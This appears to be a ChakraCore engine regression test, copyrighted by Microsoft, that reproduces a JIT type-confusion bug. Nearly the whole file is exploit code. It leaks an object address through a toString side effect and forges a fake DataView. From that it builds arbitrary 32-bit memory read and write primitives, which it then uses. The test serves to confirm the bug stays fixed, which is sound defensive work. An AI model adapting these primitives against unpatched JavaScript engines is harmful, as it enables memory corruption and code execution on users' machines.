//-------------------------------------------------------------------------------------------------------
// Copyright (C) Microsoft Corporation and contributors. All rights reserved.
// Licensed under the MIT license. See LICENSE.txt file in the project root for full license information.
//-------------------------------------------------------------------------------------------------------

function go(){
a1 = [1.1,2.2]
a2 = [1.1,2.2]
ab = new ArrayBuffer(4)
tarr = new Uint8ClampedArray(ab)

fakeaddr =  0xaaaabbbbbbbb * 4.9406564584124654E-324;
function aaa(p1,p2,ii){
    p1[0] = 1.1
    p1[1] = 2.2
    p2[0] = ii
    p1[0] = fakeaddr
  return ii
}

function bbb(p1,p2,ii){
    p1[0] = 1.1
    p1[1] = 2.2
    p2[0] = ii
  return p1[0]
}

for(var i=0; i <0x100000; i++) {
    aaa(a1,tarr,3)
}

for(var i=0; i <0x100000; i++) {
    bbb(a2,tarr,3)
}

var arr = new Array(
  0x11111111,0x11111111,0x11111111,0x11111111,0x11111111,
  0x11111111,0x11111111,0x11111111,0x11111111,0x11111111,
  0x11111111,0x11111111,0x11111111,0x11111111,0x11111111
  )
ab = new ArrayBuffer(0x100)
var farr = new Float64Array(ab)
var uarr = new Uint32Array(ab)

farr[0] = bbb(a2, tarr, {toString:function(){a2[0] = arr; return 9}})
var leakaddr = uarr[1]*0x100000000+uarr[0]

fakeaddr = (leakaddr+0x58) * 4.9406564584124654E-324;
aaa(a1, tarr, {toString:function(){a1[0] = {}; return 9}})
typeidaddr = leakaddr+0x58
abaddr = leakaddr+0x2c

function low32(v)
{
	return (v % 0x100000000);
}

function high32(v)
{
	return Math.floor(v / 0x100000000);
}

function toInt(v)
{
	return v < 0x80000000 ? v : -(0x100000000 - v);
}

function toUint(v)
{
	return v >= 0 ? v : (0x100000000 + v);
}

arr[0] = 56
arr[1] = 0
arr[2] = toInt(low32(typeidaddr))
arr[3] = toInt(high32(typeidaddr))
arr[4] = 0
arr[5] = 0
arr[6] = 0
arr[7] = 0
arr[8] = 0xabcd
arr[9] = 0
arr[10] = toInt(low32(abaddr))
arr[11] = toInt(high32(abaddr))
arr[12] = 0
arr[13] = 0
arr[14] = 0x41414141
arr[15] = 0x41414141
arr[16] = 0
arr[17] = 0

fakeobj = a1[0]

var read32 = function(addr){
  arr[14] = toInt(low32(addr))
  arr[15] = toInt(high32(addr))
  return DataView.prototype.getUint32.call(fakeobj, 0, true)
}

var write32 = function(addr, v){
  arr[14] = toInt(low32(addr))
  arr[15] = toInt(high32(addr))
  DataView.prototype.setUint32.call(fakeobj, 0, v, true)
}

WScript.Echo("vtable:" + read32(leakaddr+4).toString(16) + read32(leakaddr).toString(16))

arr.length = 0xffffffff
write32(leakaddr+0x44, 0xffffffff)
write32(leakaddr+0x48, 0xffffffff)

write32(0xaaaabbbbbbbb, 0)

}
try{
go()}catch(e){}

WScript.Echo('pass');
